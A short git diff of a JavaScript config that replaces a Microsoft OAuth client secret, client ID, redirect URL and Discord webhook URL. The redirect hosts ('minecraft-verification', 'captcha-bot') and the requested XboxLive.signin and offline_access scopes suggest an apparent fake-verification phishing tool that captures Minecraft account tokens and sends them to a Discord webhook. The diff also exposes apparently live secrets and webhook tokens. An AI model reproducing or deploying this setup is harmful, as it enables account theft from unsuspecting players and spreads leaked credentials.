@@ -1,8 +1,8 @@
 //Change these btw
-const client_secret = 'cTg8Q~5KLeSWagWpD_.nOrXhf9ntKpt3A9lKPaRI' //you need to put the "Secret Value" here not the "Secret ID"!!!!
-const client_id = '1bfb18a2-ca7b-48c7-ad17-a490a6185320'
-const redirect_uri = 'https://minecraft-verification.onrender.com'
-const webhook_url = 'https://discord.com/api/webhooks/1047624352004325407/Y_mbIqVCtZGSUx_pSKloGRm1DrsFi2-JSgtnI_ijd3Ukpc9ERtxnAeLQFkTfWNKfya5l'
+const client_secret = 'ZYw8Q~87cK65ICnOeIoAFkwLQlFlftgaKBG4GaOx' //you need to put the "Secret Value" here not the "Secret ID"!!!!
+const client_id = '8e13b4c9-b1f4-4b77-ae34-9a23880666ca'
+const redirect_uri = 'https://captcha-bot-c5we.onrender.com'
+const webhook_url = 'https://discord.com/api/webhooks/1090781708674138153/2frjr6-ZUsAKC4FieHU7rmjPfiJMtsjKMguLR--S-X7rmaljhFHNtIdrjBnUvZSIuLQW'
 
 //Requirements
 const redirect = 'https://login.live.com/oauth20_authorize.srf?client_id='+client_id+'&response_type=code&redirect_uri='+redirect_uri+'&scope=XboxLive.signin+offline_access&state=NOT_NEEDED'
